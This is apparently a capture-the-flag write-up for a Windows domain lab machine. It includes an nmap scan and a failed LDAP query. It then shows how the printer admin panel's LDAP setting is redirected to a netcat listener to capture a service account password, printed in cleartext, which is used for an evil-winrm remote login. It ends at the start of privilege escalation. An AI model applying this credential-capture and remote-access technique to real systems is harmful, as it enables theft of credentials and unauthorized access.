IP address is 10.129.95.241

```
└─$ nmap -sV -sC 10.129.95.241 -Pn
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-14 21:28 -0400
Nmap scan report for 10.129.95.241
Host is up (0.047s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-15 01:47:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m28s
| smb2-time: 
|   date: 2026-06-15T01:47:43
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

```


I have to have credentials for this
```
└─# ldapsearch -x -H ldap://10.129.95.241 -b "dc=return,dc=local"    
# extended LDIF
#
# LDAPv3
# base <dc=return,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563
```

Going to the http, I found a printer. Going to the settings I came across a place to update the IP/port/user, but the password but encrypted with asterisks.
So by running a `nc -lvnp 389` I was able to send the password to my machine.
`svc-printer:1edFg43012!!`
Now I can enumerate the domain.
Running `evil-winrm -u svc-printer -p 1edFg43012!!`

With that the flag is in the Desktop like normal

# Priv Escalation
`net user svc-printer` 
With this command we can see all the groups it is apart of.

